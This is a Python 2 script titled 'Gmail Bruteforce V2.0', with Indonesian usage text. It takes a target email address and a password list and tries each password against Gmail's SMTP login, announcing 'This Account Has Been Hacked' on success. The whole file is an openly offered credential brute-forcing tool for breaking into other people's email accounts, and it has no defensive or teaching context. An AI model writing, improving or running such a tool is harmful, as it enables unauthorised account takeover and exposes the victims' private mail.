#!/usr/bin/python
'''created by GerryVendetta'''

import smtplib
from os import system

#colours used
red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
def main():
   print (green+"""
        G~G~G   EEEE   RRRRRR   RRRRRR   YY    YY  VENDETTA 
        G       |      R    R   R    R    YY  YY     
        G G~G|  |      R  RRR   R  RRR     YYYYY     
        G    |  |EEE   R  R     R  R        YY       
        G    |  |      R   R    R   R       YY       
        GGGGGG  EEEE   R    R   R    R      YY       
                               v 2.0
"""+green)

print '================================================================='
print '                  GMAIL BRUTEFORCE V2.0                          '
print '                 Author by GerryVendetta                         '
print '                   Penggunaan? (Usage)                           '
print '              Masukkan 1 Untuk Memulai Serangan                  '
print '   Masukkan File kata sandi Saya Telah Menambahkan File Saya     '
print '        passwords.txt Anda Dapat Menambahkan File Anda               '
print '            Atau Anda Dapat Menambahkan Milik Saya               '
print '     Brother: MarioGanz ~ Mr.N31 ~ Tn.Jones ~ ./YzGanz           '
print '================================================================='

main()
print '[1] start the attack'
print '[2] exit'
option = input('Enter Option =>')
if option == 1:
   file_path = raw_input('Enter Password list :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()